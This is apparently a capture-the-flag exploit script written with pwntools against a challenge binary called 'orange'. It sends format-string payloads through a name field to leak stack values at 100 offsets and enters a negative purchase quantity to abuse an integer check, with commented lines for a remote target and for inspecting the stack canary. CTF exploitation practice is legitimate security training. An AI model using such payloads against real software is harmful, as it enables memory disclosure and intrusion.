from pwn import *
 

e = ELF("./orange")
io = e.process()
#io = remote("orange.uctf.ir", 5001)

io.sendlineafter("Enter your name: ", "%0$lx")
io.sendlineafter("Enter your choice: ", "3")
io.sendlineafter("Enter the number of oranges you want to buy: ", "-1")

for i in range(100):
  io.sendlineafter("Enter your choice: ", "5")
  io.sendlineafter("Enter your name: ", "%%%d$lx" % i)
  io.sendlineafter("Enter your choice: ", "1")
  io.recvuntil("Buyer: ")
  print("%d - %s" % (i, io.recvline().strip()))

# Attach GDB to the running process
#gdb.attach(io, gdbscript="""
#init-pwndbg
#canary
#""")
# Keep the process alive to interact with GDB
io.interactive()
